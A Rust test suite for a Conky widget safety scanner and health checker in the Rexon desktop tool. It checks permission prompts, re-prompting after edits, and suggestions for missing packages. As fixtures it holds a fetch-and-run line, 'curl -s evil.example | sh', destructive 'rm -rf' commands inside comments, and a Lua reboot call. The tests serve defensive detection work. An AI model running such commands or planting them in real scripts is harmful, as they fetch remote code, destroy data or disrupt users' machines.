//! Check of the Conky widget's "dangerous directives" (the parity plan with Conky Manager,
//! item 42): before the FIRST launch a widget that runs commands, loads
//! Lua scripts or goes to the internet asks for permission; a "yes" answer
//! is remembered by the fingerprint of the widget's files, and after they are edited the question
//! comes back.
//!
//! The machine is a fake in-memory `LookIo`: the widget tree lies in a map,
//! the write of the permissions file is visible to the check.

mod i18n_pin;

use std::cell::RefCell;
use std::collections::BTreeMap;

use rexon_core::animations::LookIo;
use rexon_core::conky_safety::{self as cs, RiskKind};
use rexon_core::de_apply::Ctx;

/// Machine files: path → contents (`None` — binary, not readable as text).
struct Machine {
    files: RefCell<BTreeMap<String, Option<String>>>,
    /// Programs that are not in PATH.
    missing: RefCell<Vec<String>>,
}

impl Machine {
    fn new(files: &[(&str, &str)]) -> Self {
        let m = Machine { files: RefCell::new(BTreeMap::new()), missing: RefCell::new(Vec::new()) };
        for (p, t) in files {
            m.put(p, t);
        }
        m
    }
    fn put(&self, path: &str, text: &str) {
        self.files.borrow_mut().insert(path.to_string(), Some(text.to_string()));
    }
    fn put_binary(&self, path: &str) {
        self.files.borrow_mut().insert(path.to_string(), None);
    }
}

impl LookIo for Machine {
    fn run(&self, _argv: &[String]) -> (bool, String) {
        (false, String::new())
    }
    fn have(&self, tool: &str) -> bool {
        !self.missing.borrow().iter().any(|t| t == tool)
    }
    fn read(&self, path: &str) -> Option<String> {
        self.files.borrow().get(path).cloned().flatten()
    }
    fn write(&self, path: &str, text: &str) -> bool {
        self.put(path, text);
        true
    }
    fn list_dir(&self, path: &str) -> Vec<String> {
        let prefix = format!("{}/", path.trim_end_matches('/'));
        let mut out: Vec<String> = Vec::new();
        for p in self.files.borrow().keys() {
            if let Some(rest) = p.strip_prefix(&prefix) {
                let name = rest.split('/').next().unwrap_or("").to_string();
                if !name.is_empty() && !out.contains(&name) {
                    out.push(name);
                }
            }
        }
        out.sort();
        out
    }
}

const HOME: &str = "/home/u";
const ROOT: &str = "/home/u/.config/conky";

fn ctx() -> Ctx {
    Ctx { home: HOME.into(), xdg_config_home: None, wayland: false, de: "mate".into() }
}

/// A clock without a single command.
const CLOCK: &str = r#"conky.config = {
    alignment = 'top_right',
    update_interval = 1,
    -- execi в комментарии не считается: ${execi 10 rm -rf ~}
}
conky.text = [[
${time %H:%M}
]]
"#;

/// Weather and sensors: commands, a Lua script and a download from the internet.
const WEATHER: &str = r#"conky.config = {
    lua_load = './rings.lua',
    lua_draw_hook_pre = 'main',
}
conky.text = [[
${execi 300 sensors | grep Core}
${texeci 600 ./weather.sh}
${curl https://wttr.in/?format=3 600}
${exec playerctl metadata title}
]]
"#;

const RINGS: &str = r#"
-- os.execute("закомментировано")
function conky_main()
    local f = io.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv")
    os.execute('notify-send hi')
end
"#;

/// The old 1.9 syntax: commands after TEXT.
const OLD_SYNTAX: &str = "# старый виджет\n\
# ${exec rm -rf /} — комментарий\n\
alignment top_left\n\
lua_load ~/.config/conky/old/draw.lua\n\
TEXT\n\
${execpi 60 ~/.config/conky/old/cal.sh}\n\
${rss https://example.org/feed.xml 30 item_titles 5}\n";

fn widget_machine() -> Machine {
    let m = Machine::new(&[
        (&format!("{ROOT}/clock/conky.conf"), CLOCK),
        (&format!("{ROOT}/weather/conky.conf"), WEATHER),
        (&format!("{ROOT}/weather/rings.lua"), RINGS),
        (&format!("{ROOT}/weather/weather.sh"), "#!/bin/sh\ncurl -s wttr.in\n"),
        (&format!("{ROOT}/old/.conkyrc"), OLD_SYNTAX),
        (&format!("{ROOT}/old/draw.lua"), "function conky_draw() end\n"),
    ]);
    m.put_binary(&format!("{ROOT}/weather/bg.png"));
    m
}

#[test]
fn safe_widget_asks_nothing() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::scan_widget(&m, &ctx(), "clock").is_empty());
    assert_eq!(cs::start_question(&m, &ctx(), "clock"), None);
    assert_eq!(cs::start_refusal(&m, &ctx(), "clock"), None);
}

#[test]
fn scanner_finds_execi_lua_load_and_curl() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    let risks = cs::scan_widget(&m, &ctx(), "weather");
    let has = |kind: RiskKind, what: &str| risks.iter().any(|r| r.kind == kind && r.what == what);
    assert!(has(RiskKind::Command, "sensors | grep Core"), "{risks:#?}");
    assert!(has(RiskKind::Command, "./weather.sh"), "{risks:#?}");
    assert!(has(RiskKind::Command, "playerctl metadata title"), "{risks:#?}");
    assert!(has(RiskKind::LuaScript, "./rings.lua"), "{risks:#?}");
    assert!(has(RiskKind::Network, "https://wttr.in/?format=3"), "{risks:#?}");
    // Commands from the Lua script itself — with the file where they are.
    assert!(
        risks.iter().any(|r| r.kind == RiskKind::Command
            && r.what.starts_with("nvidia-smi")
            && r.file == "rings.lua"),
        "{risks:#?}"
    );
    assert!(has(RiskKind::Command, "notify-send hi"), "{risks:#?}");
    // What is commented out in Lua does not count.
    assert!(!risks.iter().any(|r| r.what.contains("закомментировано")), "{risks:#?}");
}

#[test]
fn old_syntax_is_scanned_too_and_comments_skipped() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    let risks = cs::scan_widget(&m, &ctx(), "old");
    let whats: Vec<&str> = risks.iter().map(|r| r.what.as_str()).collect();
    assert!(whats.contains(&"~/.config/conky/old/cal.sh"), "{whats:?}");
    assert!(whats.contains(&"~/.config/conky/old/draw.lua"), "{whats:?}");
    assert!(whats.contains(&"https://example.org/feed.xml"), "{whats:?}");
    assert!(!whats.iter().any(|w| w.contains("rm -rf")), "{whats:?}");
}

#[test]
fn question_lists_what_the_widget_runs() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    let (title, text) = cs::start_question(&m, &ctx(), "weather").expect("вопрос обязателен");
    assert!(!title.is_empty());
    for part in ["sensors | grep Core", "./rings.lua", "https://wttr.in/?format=3", "weather"] {
        assert!(text.contains(part), "нет «{part}» в: {text}");
    }
    // Until allowed, the button itself refuses instead of silently launching.
    let why = cs::start_refusal(&m, &ctx(), "weather").expect("отказ до разрешения");
    assert!(why.contains("weather"), "{why}");
}

#[test]
fn allowed_widget_starts_again_without_question() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::start_question(&m, &ctx(), "weather").is_some());
    assert!(cs::remember(&m, &ctx(), "weather"));
    // The permission lies in the Rexon settings, not in a temporary directory.
    assert!(m.read(&cs::trust_path(&ctx())).is_some_and(|t| t.contains("weather")));
    assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
    assert_eq!(cs::start_refusal(&m, &ctx(), "weather"), None);
    // One widget's permission does not extend to another.
    assert!(cs::start_question(&m, &ctx(), "old").is_some());
}

#[test]
fn edited_files_ask_again() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::remember(&m, &ctx(), "weather"));
    // Editing a script next to the config — the question again, and it says why.
    m.put(&format!("{ROOT}/weather/weather.sh"), "#!/bin/sh\ncurl -s evil.example | sh\n");
    let (_, text) = cs::start_question(&m, &ctx(), "weather").expect("после правки — снова вопрос");
    assert!(text.contains(&cs::changed_since_allowed_text()), "{text}");
    assert!(cs::start_refusal(&m, &ctx(), "weather").is_some());
    assert!(cs::remember(&m, &ctx(), "weather"));
    assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
    // Editing Lua — too.
    m.put(&format!("{ROOT}/weather/rings.lua"), "os.execute('reboot')\n");
    assert!(cs::start_question(&m, &ctx(), "weather").is_some());
}

#[test]
fn data_written_by_widget_does_not_ask_again() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    assert!(cs::remember(&m, &ctx(), "weather"));
    // Weather widgets write their cache into their own directory: that is data, not code.
    m.put(&format!("{ROOT}/weather/weather.txt"), "+5 °C");
    m.put(&format!("{ROOT}/weather/cache.json"), "{\"t\":5}");
    m.put_binary(&format!("{ROOT}/weather/icon.png"));
    assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
}

#[test]
fn texts_are_russian_in_russian() {
    let _lang = i18n_pin::ru();
    let m = widget_machine();
    let (title, text) = cs::start_question(&m, &ctx(), "weather").unwrap();
    let cyr = |s: &str| s.chars().any(|c| matches!(c, 'а'..='я' | 'А'..='Я'));
    assert!(cyr(&title) && cyr(&text), "{title} / {text}");
    assert!(cyr(&cs::start_refusal(&m, &ctx(), "weather").unwrap()));
    assert!(cyr(&cs::declined_text("weather")));
}

// ============================================================================
// Widget health (parity plan, item 40)
// ============================================================================

/// Sensors, the graphics card and weather — with programs that are missing, and scripts
/// that are missing.
const SENSORS: &str = r#"conky.config = {
    lua_load = './gone.lua',
}
conky.text = [[
${execi 5 sensors | grep Core | awk '{print $3}'}
${exec nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader}
${texeci 600 LANG=C ./weather.sh}
${exec ./missing.sh}
${execi 60 if true; then echo ok; fi}
]]
"#;

fn sick_machine(missing: &[&str]) -> Machine {
    let m = widget_machine();
    m.put(&format!("{ROOT}/sensors/conky.conf"), SENSORS);
    m.put(&format!("{ROOT}/sensors/weather.sh"), "#!/bin/sh\nwget -qO- wttr.in\n");
    *m.missing.borrow_mut() = missing.iter().map(|s| s.to_string()).collect();
    m
}

#[test]
fn health_names_sensors_package_for_each_family() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["sensors", "nvidia-smi"]);
    for (family, package) in [("arch", "lm_sensors"), ("debian", "lm-sensors"), ("fedora", "lm_sensors"), ("suse", "sensors")] {
        let h = cs::health(&m, &ctx(), "sensors", family);
        assert!(
            h.missing_programs.contains(&cs::MissingProgram { program: "sensors".into(), package: Some(package.into()), aur: None }),
            "{family}: {h:#?}"
        );
        // nvidia-smi comes with the driver — we do not offer a package.
        assert!(
            h.missing_programs.contains(&cs::MissingProgram { program: "nvidia-smi".into(), package: None, aur: None }),
            "{family}: {h:#?}"
        );
        // Present in PATH, shell builtins and assignments are not programs.
        let names: Vec<&str> = h.missing_programs.iter().map(|p| p.program.as_str()).collect();
        assert_eq!(names.len(), 2, "{names:?}");
        assert_eq!(h.packages(), vec![package.to_string()]);
        assert_eq!(h.missing_files, vec!["./gone.lua".to_string(), "./missing.sh".to_string()], "{h:#?}");
    }
    // An unfamiliar family — the program is named, the package is not.
    let h = cs::health(&m, &ctx(), "sensors", "nix");
    assert!(h.packages().is_empty(), "{h:#?}");
}

#[test]
fn healthy_widget_needs_nothing() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["sensors"]);
    let h = cs::health(&m, &ctx(), "clock", "arch");
    assert!(h.is_fine(), "{h:#?}");
    assert_eq!(cs::start_plan("clock", &h, true), cs::StartPlan::Go);
    assert_eq!(cs::files_note(&h), None);
    // Everything is in place — and a widget with commands gets no question either.
    let m = widget_machine();
    m.put(&format!("{ROOT}/weather/rings.lua"), "function conky_main() end\n");
    assert!(cs::health(&m, &ctx(), "weather", "arch").missing_programs.is_empty());
}

#[test]
fn repo_packages_install_without_question_only_where_rexon_can() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["sensors"]);
    let h = cs::health(&m, &ctx(), "sensors", "arch");
    // A package from the repositories is installed by itself — there is no «Да/Нет» question.
    assert_eq!(cs::start_plan("sensors", &h, true), cs::StartPlan::Install(vec!["lm_sensors".to_string()]));
    // Missing files cannot be installed with a package — as a note to the result.
    assert!(cs::files_note(&h).is_some_and(|n| n.contains("./gone.lua")));
    // SteamOS and immutable systems: installing is not allowed — the widget is not
    // launched, and it says what to install yourself.
    let cs::StartPlan::Refuse(text) = cs::start_plan("sensors", &h, false) else { panic!("должен быть отказ") };
    assert!(text.contains("wasn't started") && text.contains("Install sensors yourself"), "{text}");
}

#[test]
fn program_without_package_refuses_start_without_password() {
    let _lang = i18n_pin::en();
    // nvidia-smi comes with the driver: nothing to install, and lm_sensors for a
    // widget that will not launch anyway does not ask for the password.
    let m = sick_machine(&["sensors", "nvidia-smi"]);
    let h = cs::health(&m, &ctx(), "sensors", "arch");
    let cs::StartPlan::Refuse(text) = cs::start_plan("sensors", &h, true) else { panic!("должен быть отказ") };
    for part in ["The widget “sensors” wasn't started", "without the programs sensors, nvidia-smi", "Install nvidia-smi yourself"] {
        assert!(text.contains(part), "нет «{part}» в: {text}");
    }
    assert!(!text.contains("password"), "{text}");
}

#[test]
fn canceled_install_refuses_start_and_says_how_to_retry() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    let h = cs::health(&m, &ctx(), "eq", "arch");
    assert_eq!(cs::start_plan("eq", &h, true), cs::StartPlan::Install(vec!["cava".to_string()]));
    // The polkit password was cancelled: the widget is NOT launched, the result says why and how
    // to install again; we do not repeat the reason "password not confirmed".
    let canceled = Err(rexon_core::appearance_installer::password_not_confirmed());
    let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &canceled) else { panic!("должен быть отказ") };
    assert_eq!(
        text,
        "The widget “eq” wasn't started: without the program cava it doesn't fully work. \
         Press “▶️ Start” again and enter the password to install it."
    );
    // A package manager error — with the reason.
    let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &Err("the package manager reported an error".into())) else {
        panic!("должен быть отказ")
    };
    assert!(text.contains("Installation failed: the package manager reported an error."), "{text}");
    // Installed, and the program is on disk — launch.
    assert_eq!(cs::after_install("eq", &h, &cs::Health::default(), &Ok(())), cs::StartPlan::Go);
    // The package "installed", but the program is not there — no launch.
    assert!(matches!(cs::after_install("eq", &h, &h, &Ok(())), cs::StartPlan::Refuse(_)));
}

#[test]
fn part_button_refuses_and_points_to_the_tile() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    let h = cs::health(&m, &ctx(), "eq", "arch");
    let text = cs::part_refusal("eq", &h, true).expect("отказ части");
    assert!(text.contains("Start the widget with “▶️ Start” on its tile"), "{text}");
    assert_eq!(cs::part_refusal("eq", &cs::Health::default(), true), None);
}

#[test]
fn package_table_for_widget_programs() {
    assert_eq!(cs::program_package("wget", "fedora").as_deref(), Some("wget2-wget"));
    assert_eq!(cs::program_package("wget", "debian").as_deref(), Some("wget"));
    assert_eq!(cs::program_package("sensors", "suse").as_deref(), Some("sensors"));
    assert_eq!(cs::program_package("nvidia-smi", "arch"), None);
    assert_eq!(cs::program_package("sensors", "nix"), None);
}

/// An equalizer like Jhalak: the command for `io.popen` is assembled from strings in
/// a variable, the program is not in PATH.
const VISUALIZER: &str = r#"
local CONFIG_FILE = './cava.conf'
local function start_cava()
    local cmd = 'cava -p ' .. CONFIG_FILE .. ' 2>/dev/null'
    cava_pipe = io.popen(cmd, 'r')
end
"#;

fn visualizer_machine() -> Machine {
    let m = Machine::new(&[
        (&format!("{ROOT}/eq/conky.conf"), "conky.config = { lua_load = './visualizer.lua' }\nconky.text = [[ ]]\n"),
        (&format!("{ROOT}/eq/visualizer.lua"), VISUALIZER),
        (&format!("{ROOT}/eq/cava.conf"), "[general]\nbars = 64\n"),
    ]);
    *m.missing.borrow_mut() = vec!["cava".to_string()];
    m
}

#[test]
fn command_built_from_lua_strings_is_shown_and_checked() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    // The question shows the command itself, not "io.popen(cmd, 'r')".
    let risks = cs::scan_widget(&m, &ctx(), "eq");
    assert!(
        risks.iter().any(|r| r.kind == RiskKind::Command && r.what == "cava -p ./cava.conf 2>/dev/null"),
        "{risks:#?}"
    );
    // The missing program is found, the package comes from the family's repositories.
    for family in ["arch", "debian", "fedora", "suse"] {
        let h = cs::health(&m, &ctx(), "eq", family);
        assert_eq!(
            h.missing_programs,
            vec![cs::MissingProgram { program: "cava".into(), package: Some("cava".into()), aur: None }],
            "{family}"
        );
        assert!(h.missing_files.is_empty(), "{family}: {h:#?}");
    }
    assert_eq!(cs::start_plan("eq", &cs::health(&m, &ctx(), "eq", "arch"), true), cs::StartPlan::Install(vec!["cava".to_string()]));
}

#[test]
fn aur_only_program_is_named_with_its_aur_package() {
    let _lang = i18n_pin::en();
    // xdg-terminal-exec exists in Arch only in AUR: Rexon does not install it, but
    // says where to get it.
    let m = Machine::new(&[(&format!("{ROOT}/term/conky.conf"), "conky.text = [[ ${exec xdg-terminal-exec htop} ]]\n")]);
    *m.missing.borrow_mut() = vec!["xdg-terminal-exec".to_string()];
    let h = cs::health(&m, &ctx(), "term", "arch");
    assert_eq!(
        h.missing_programs,
        vec![cs::MissingProgram { program: "xdg-terminal-exec".into(), package: None, aur: Some("xdg-terminal-exec".into()) }]
    );
    // A package only from AUR is not installed by itself: building from AUR without asking
    // is not allowed.
    assert!(h.packages().is_empty());
    // The widget is not launched, and it says how to install from AUR yourself.
    let cs::StartPlan::Refuse(text) = cs::start_plan("term", &h, true) else { panic!("должен быть отказ") };
    assert_eq!(
        text,
        "The widget “term” wasn't started: without the program xdg-terminal-exec it doesn't fully work. \
         xdg-terminal-exec is only in the AUR — install it (for example, yay -S xdg-terminal-exec) and \
         start the widget again."
    );
    // In Debian the package is in the repositories — not a word about AUR.
    let h = cs::health(&m, &ctx(), "term", "debian");
    assert_eq!(h.missing_programs[0].aur, None);
    assert_eq!(cs::program_aur_package("xdg-terminal-exec", "debian"), None);
}

#[test]
fn health_texts_are_russian_in_russian() {
    let _lang = i18n_pin::ru();
    let m = visualizer_machine();
    let h = cs::health(&m, &ctx(), "eq", "arch");
    let canceled = Err(rexon_core::appearance_installer::password_not_confirmed());
    let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &canceled) else { panic!("должен быть отказ") };
    assert_eq!(
        text,
        "Виджет «eq» не запущен: без программы cava он работает не полностью. \
         Нажмите «▶️ Запустить» ещё раз и введите пароль, чтобы её установить."
    );
    let aur = cs::Health {
        missing_files: vec!["./a.lua".into()],
        missing_programs: vec![cs::MissingProgram { program: "cava".into(), package: None, aur: Some("cava-git".into()) }],
    };
    let cs::StartPlan::Refuse(text) = cs::start_plan("eq", &aur, true) else { panic!("должен быть отказ") };
    assert!(text.ends_with("cava есть только в AUR — установите её (например, yay -S cava-git) и запустите виджет снова."), "{text}");
    let r = cs::prepare_start(&m, &ctx(), &["eq".to_string()], "arch", true, cs::Retry::Set, &|_| canceled.clone());
    assert_eq!(
        r,
        [Err("Виджет «eq» не запущен: без программы cava он работает не полностью. \
              Примените набор ещё раз и введите пароль, чтобы её установить."
            .to_string())]
    );
    let cyr = |s: &str| s.chars().any(|c| matches!(c, 'а'..='я' | 'А'..='Я'));
    assert!(cyr(&cs::files_note(&aur).unwrap()));
    assert!(cyr(&cs::part_refusal("eq", &h, true).unwrap()));
}

/// The common "all or nothing" path for a set (and a tile): the missing packages
/// of all widgets in one installation, without repeats; whatever did not install or cannot
/// be installed — that widget is not launched, the rest go.
#[test]
fn set_installs_once_and_refuses_only_the_sick_widget() {
    let _lang = i18n_pin::en();
    let m = sick_machine(&["cava", "sensors", "nvidia-smi"]);
    m.put(&format!("{ROOT}/eq/conky.conf"), "conky.config = { lua_load = './visualizer.lua' }\nconky.text = [[ ]]\n");
    m.put(&format!("{ROOT}/eq/visualizer.lua"), VISUALIZER);
    m.put(&format!("{ROOT}/eq2/conky.conf"), "conky.config = { lua_load = './visualizer.lua' }\nconky.text = [[ ]]\n");
    m.put(&format!("{ROOT}/eq2/visualizer.lua"), VISUALIZER);
    for w in ["eq", "eq2"] {
        m.put(&format!("{ROOT}/{w}/cava.conf"), "[general]\nbars = 64\n");
    }
    let ids: Vec<String> = ["eq", "sensors", "clock", "eq2"].map(String::from).to_vec();
    let calls = RefCell::new(Vec::<Vec<String>>::new());
    let install = |packages: &[String]| {
        calls.borrow_mut().push(packages.to_vec());
        m.missing.borrow_mut().retain(|p| !packages.contains(p));
        Ok(())
    };
    let r = cs::prepare_start(&m, &ctx(), &ids, "arch", true, cs::Retry::Set, &install);
    // sensors will not launch anyway (nvidia-smi cannot be installed) — its
    // lm_sensors does not ask for the password; cava of two equalizers — once.
    assert_eq!(*calls.borrow(), [vec!["cava".to_string()]]);
    assert_eq!(r.len(), 4);
    assert_eq!(r[0], Ok(None));
    let Err(text) = &r[1] else { panic!("sensors должен получить отказ: {r:?}") };
    assert!(text.contains("The widget “sensors” wasn't started") && text.contains("Install nvidia-smi yourself"), "{text}");
    assert_eq!(r[2], Ok(None));
    assert_eq!(r[3], Ok(None));

    // The password was not confirmed — the equalizer is not launched, and it says that
    // the set's «Применить» must be repeated; the clock runs.
    let m = visualizer_machine();
    m.put(&format!("{ROOT}/clock/conky.conf"), CLOCK);
    let canceled = |_: &[String]| Err(rexon_core::appearance_installer::password_not_confirmed());
    let ids: Vec<String> = ["eq", "clock"].map(String::from).to_vec();
    let r = cs::prepare_start(&m, &ctx(), &ids, "arch", true, cs::Retry::Set, &canceled);
    assert_eq!(
        r[0],
        Err("The widget “eq” wasn't started: without the program cava it doesn't fully work. \
             Apply the set again and enter the password to install it."
            .to_string())
    );
    assert_eq!(r[1], Ok(None));
    // Nothing to install — the installation is not called at all.
    let never = |_: &[String]| -> Result<(), String> { panic!("установка не нужна") };
    assert_eq!(cs::prepare_start(&m, &ctx(), &["clock".to_string()], "arch", true, cs::Retry::Tile, &never), [Ok(None)]);
}

/// «Запускать при входе»: at login the widget will launch without Rexon, so
/// enabling goes through the same "all or nothing" path; a refusal suggests
/// turning the switch on again.
#[test]
fn autostart_switch_checks_programs_too() {
    let _lang = i18n_pin::en();
    let m = visualizer_machine();
    let canceled = |_: &[String]| Err(rexon_core::appearance_installer::password_not_confirmed());
    let r = cs::prepare_start(&m, &ctx(), &["eq".to_string()], "arch", true, cs::Retry::Autostart, &canceled);
    assert_eq!(
        r,
        [Err("The widget “eq” wasn't started: without the program cava it doesn't fully work. \
              Turn on “Start at login” again and enter the password to install it."
            .to_string())]
    );
}

/// A Lua script builds the path to its files from the home directory
/// (`'${execi 2 bash ' .. HOME .. '/.config/conky/skyrim/scripts/gpu.sh}'`,
/// the skyrim widget, live check 15.11.2026): the files are in place — no false
/// "widget files missing"; a path from an unknown variable is not checked,
/// while a real loss under the home directory is still seen.
#[test]
fn lua_paths_from_home_are_not_reported_missing() {
    let _lang = i18n_pin::en();
    let m = widget_machine();
    m.put(&format!("{ROOT}/skyrim/conky.conf"), "conky.config = { lua_load = './lua/anim.lua' }\nconky.text = [[x]]\n");
    m.put(
        &format!("{ROOT}/skyrim/lua/anim.lua"),
        "local HOME = os.getenv('HOME')\n\
         local rows = {\n\
           { expr = '${execi 2 bash ' .. HOME .. '/.config/conky/skyrim/scripts/gpu.sh}' },\n\
           { expr = '${execi 9 bash ' .. SOMEWHERE .. '/x.sh}' },\n\
           { expr = '${execi 9 bash ' .. HOME .. '/.config/conky/skyrim/scripts/gone.sh}' },\n\
         }\n",
    );
    m.put(&format!("{ROOT}/skyrim/scripts/gpu.sh"), "#!/bin/sh\necho 1\n");
    let h = cs::health(&m, &ctx(), "skyrim", "arch");
    assert_eq!(h.missing_files, vec!["~/.config/conky/skyrim/scripts/gone.sh".to_string()], "{h:#?}");
}
